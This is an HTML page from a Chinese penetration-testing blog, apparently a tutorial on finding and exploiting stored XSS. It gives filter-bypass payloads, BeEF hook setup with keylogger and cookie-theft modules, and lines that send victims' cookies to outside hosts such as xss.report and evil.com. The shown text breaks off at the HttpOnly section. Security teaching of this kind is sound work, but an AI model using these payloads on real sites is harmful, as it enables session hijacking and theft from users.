@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="存储型XSS（Stored XSS）将恶意脚本持久化到服务端，受害者每次访问页面都会触发，不经二次请求即可扩大影响面。文章覆盖评论&#x2F;富文本&#x2F;个人资料等实战挖掘场景、存储上下文的过滤绕过技巧、Beef&#x2F;XSSHunter 平台联动、HttpOnly 绕过与 Cookie 窃取、SRC 真实案例复盘，以及 CSP + 输出编码的纵深防御方案。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="存储型XSS挖掘与利用">
+<meta property="og:url" content="https://congliang.github.io/XSS-stored-practical/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="存储型XSS（Stored XSS）将恶意脚本持久化到服务端，受害者每次访问页面都会触发，不经二次请求即可扩大影响面。文章覆盖评论&#x2F;富文本&#x2F;个人资料等实战挖掘场景、存储上下文的过滤绕过技巧、Beef&#x2F;XSSHunter 平台联动、HttpOnly 绕过与 Cookie 窃取、SRC 真实案例复盘，以及 CSP + 输出编码的纵深防御方案。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:35:18.353Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/XSS-stored-practical/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/XSS-stored-practical/","path":"XSS-stored-practical/","title":"存储型XSS挖掘与利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>存储型XSS挖掘与利用 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3"><span class="nav-number">2.</span> <span class="nav-text">常见入口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%AF%84%E8%AE%BA%E5%8C%BA-%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">2.1.</span> <span class="nav-text">1. 评论区 &#x2F; 留言板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%94%A8%E6%88%B7%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99"><span class="nav-number">2.2.</span> <span class="nav-text">2. 用户个人资料</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8"><span class="nav-number">2.3.</span> <span class="nav-text">3. 富文本编辑器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3"><span class="nav-number">2.4.</span> <span class="nav-text">4. 文件上传相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%AB%99%E5%86%85%E4%BF%A1-%E7%A7%81%E4%BF%A1"><span class="nav-number">2.5.</span> <span class="nav-text">5. 站内信 &#x2F; 私信</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E4%B8%8A%E4%B8%8B%E6%96%87%E7%9A%84%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">存储上下文的过滤绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-%E5%B9%B3%E5%8F%B0%E8%81%94%E5%8A%A8"><span class="nav-number">4.</span> <span class="nav-text">XSS 平台联动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Beef"><span class="nav-number">4.1.</span> <span class="nav-text">Beef</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSSHunter-BlueLotus"><span class="nav-number">4.2.</span> <span class="nav-text">XSSHunter &#x2F; BlueLotus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-%E7%AA%83%E5%8F%96%E4%B8%8E-HttpOnly-%E7%BB%95%E8%BF%87"><span class="nav-number">4.3.</span> <span class="nav-text">Cookie 窃取与 HttpOnly 绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SRC-%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="nav-number">5.</span> <span class="nav-text">SRC 实战案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E8%AF%84%E8%AE%BA-XSS-%E2%86%92-%E7%AE%A1%E7%90%86%E5%91%98%E5%8A%AB%E6%8C%81"><span class="nav-number">5.1.</span> <span class="nav-text">案例一：评论 XSS → 管理员劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E5%AF%8C%E6%96%87%E6%9C%AC%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">5.2.</span> <span class="nav-text">案例二：富文本实体编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%89%EF%BC%9ASVG-%E5%A4%B4%E5%83%8F-EXIF-XSS"><span class="nav-number">5.3.</span> <span class="nav-text">案例三：SVG 头像 + EXIF XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%96%E6%8E%98-Checklist"><span class="nav-number">6.</span> <span class="nav-text">挖掘 Checklist</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="nav-number">7.</span> <span class="nav-text">防御方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81%E2%80%94%E2%80%94%E6%9C%80%E5%90%8E%E9%98%B2%E7%BA%BF"><span class="nav-number">7.1.</span> <span class="nav-text">1. 输出编码——最后防线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AF%8C%E6%96%87%E6%9C%AC%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="nav-number">7.2.</span> <span class="nav-text">2. 富文本白名单过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-CSP-%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1"><span class="nav-number">7.3.</span> <span class="nav-text">3. CSP 纵深防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Cookie-%E5%8A%A0%E5%9B%BA"><span class="nav-number">7.4.</span> <span class="nav-text">4. Cookie 加固</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E6%B5%81"><span class="nav-number">7.5.</span> <span class="nav-text">5. 纵深防御流</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%B8%A9%E5%9D%91"><span class="nav-number">8.</span> <span class="nav-text">常见踩坑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">9.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">10.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/XSS-stored-practical/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="存储型XSS挖掘与利用 | 渗透测试实战记录">
+      <meta itemprop="description" content="存储型XSS（Stored XSS）将恶意脚本持久化到服务端，受害者每次访问页面都会触发，不经二次请求即可扩大影响面。文章覆盖评论&#x2F;富文本&#x2F;个人资料等实战挖掘场景、存储上下文的过滤绕过技巧、Beef&#x2F;XSSHunter 平台联动、HttpOnly 绕过与 Cookie 窃取、SRC 真实案例复盘，以及 CSP + 输出编码的纵深防御方案。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          存储型XSS挖掘与利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-03-01T08:00:00+08:00">2025-03-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">存储型XSS（Stored XSS）将恶意脚本持久化到服务端，受害者每次访问页面都会触发，不经二次请求即可扩大影响面。文章覆盖评论/富文本/个人资料等实战挖掘场景、存储上下文的过滤绕过技巧、Beef/XSSHunter 平台联动、HttpOnly 绕过与 Cookie 窃取、SRC 真实案例复盘，以及 CSP + 输出编码的纵深防御方案。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>存储型 XSS（Stored&#x2F;Persistent XSS）是跨站脚本中危害最大的一类：payload 写入数据库后，每个访问页面的用户都自动中招，无需钓鱼链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击者 ──POST──→ 服务端 ──INSERT──→ 数据库</span><br><span class="line">                                      │</span><br><span class="line">受害者A ───GET──→ 服务端 ←──SELECT─── 数据库（返回 payload）</span><br><span class="line">受害者B ───GET──→ 触发   管理员 ───GET──→ 触发</span><br></pre></td></tr></table></figure>
+
+<p>反射型 XSS 是”一次链接、一个受害者”，存储型 XSS 是一经植入便持续生效的”后门”。</p>
+<hr>
+<h2 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h2><h3 id="1-评论区-留言板"><a href="#1-评论区-留言板" class="headerlink" title="1. 评论区 &#x2F; 留言板"></a>1. 评论区 &#x2F; 留言板</h3><p>最经典的入口。恶意评论提交后，其他用户浏览评论区即触发。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">domain</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>提交后刷新页面，确认 payload 是否原样输出</li>
+<li>查看页面源代码，判断 HTML 实体编码情况</li>
+<li>有审核机制需等审核通过后再验证</li>
+</ul>
+<h3 id="2-用户个人资料"><a href="#2-用户个人资料" class="headerlink" title="2. 用户个人资料"></a>2. 用户个人资料</h3><p>昵称、签名、简介等字段后端常当作”受信任数据”直接输出，过滤较松。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/user/123&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 改昵称为 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">fetch(</span>&#x27;//<span class="attr">xss.report</span>?<span class="attr">c</span>=<span class="string">&#x27;+document.cookie)&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>SRC 中常有人用此招打到客服&#x2F;管理后台。</p>
+<h3 id="3-富文本编辑器"><a href="#3-富文本编辑器" class="headerlink" title="3. 富文本编辑器"></a>3. 富文本编辑器</h3><p>UEditor、KindEditor、CKEditor、Quill、TinyMCE 等允许提交 HTML，后端必须白名单过滤。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background:url(javascript:alert(1))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-文件上传相关"><a href="#4-文件上传相关" class="headerlink" title="4. 文件上传相关"></a>4. 文件上传相关</h3><p>文件名、描述、EXIF、SVG 内容展示时未编码即可触发。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 文件名 --&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SVG 内嵌脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-站内信-私信"><a href="#5-站内信-私信" class="headerlink" title="5. 站内信 &#x2F; 私信"></a>5. 站内信 &#x2F; 私信</h3><p>发件人可控内容在收件人界面触发；客服系统尤为高危——客服打开恶意工单即中招。</p>
+<hr>
+<h2 id="存储上下文的过滤绕过"><a href="#存储上下文的过滤绕过" class="headerlink" title="存储上下文的过滤绕过"></a>存储上下文的过滤绕过</h2><p>存储型 payload 经历 <strong>写入过滤 → 入库 → 读出渲染</strong> 全链路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → [前端过滤(可绕过)] → [WAF] → [后端过滤] → [入库] → [读出渲染]</span><br><span class="line">                ↑                              ↑              ↑</span><br><span class="line">          仅用于用户体验                   正则/关键词      输出编码是最后防线</span><br></pre></td></tr></table></figure>
+
+<p><strong>大小写混写：</strong><br><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code>  &#x2F;  <code>&lt;ImG sRc=x OnErRoR=alert(1)&gt;</code></p>
+<p><strong>双写绕过</strong>（后端只做一次替换时）：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+<p><strong>编码绕过：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span>(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span>:alert(1)&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>换行&#x2F;反引号：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=</span></span><br><span class="line"><span class="tag"><span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>冷门事件属性</strong>（WAF 只拦 onerror&#x2F;onload，HTML5 有 100+ 事件）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>二次渲染差异：</strong> 同一数据前台做了 HTML 编码，后台管理列表却用 <code>innerHTML</code> 直接渲染——专门打管理员。</p>
+<hr>
+<h2 id="XSS-平台联动"><a href="#XSS-平台联动" class="headerlink" title="XSS 平台联动"></a>XSS 平台联动</h2><p>手动 <code>alert(1)</code> 只能证明漏洞存在，实战需用 XSS 平台接管浏览器。</p>
+<h3 id="Beef"><a href="#Beef" class="headerlink" title="Beef"></a>Beef</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/beefproject/beef.git</span><br><span class="line"><span class="built_in">cd</span> beef &amp;&amp; ./install &amp;&amp; ./beef</span><br><span class="line"><span class="comment"># 面板: http://127.0.0.1:3000/ui/panel  Hook: http://&lt;ip&gt;:3000/hook.js</span></span><br></pre></td></tr></table></figure>
+
+<p>注入 payload：<code>&lt;script src=&quot;http://&lt;your-ip&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>功能</th>
+<th>模块</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Get Cookie</td>
+<td>窃取 Cookie</td>
+<td>Screenshot</td>
+<td>截屏</td>
+</tr>
+<tr>
+<td>Keylogger</td>
+<td>键盘记录</td>
+<td>Port Scanner</td>
+<td>内网扫描</td>
+</tr>
+<tr>
+<td>Redirect</td>
+<td>钓鱼跳转</td>
+<td>Get Form Values</td>
+<td>抓取表单</td>
+</tr>
+</tbody></table>
+<h3 id="XSSHunter-BlueLotus"><a href="#XSSHunter-BlueLotus" class="headerlink" title="XSSHunter &#x2F; BlueLotus"></a>XSSHunter &#x2F; BlueLotus</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;new Image().src=&#x27;//&lt;sub&gt;.xss.ht/log?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>XSSHunter</strong>：轻量盲打平台，Burp Collaborator 风格</li>
+<li><strong>BlueLotus（蓝莲花）</strong>：开源多项目 XSS 数据收集平台</li>
+</ul>
+<h3 id="Cookie-窃取与-HttpOnly-绕过"><a href="#Cookie-窃取与-HttpOnly-绕过" class="headerlink" title="Cookie 窃取与 HttpOnly 绕过"></a>Cookie 窃取与 HttpOnly 绕过</h3><p>常规窃取（对非 HttpOnly Cookie 有效）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;//evil.com/steal?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></table></figure>
+
+<p><code>HttpOnly</code> Cookie 禁止 JS 读取，绕过思路：</p>
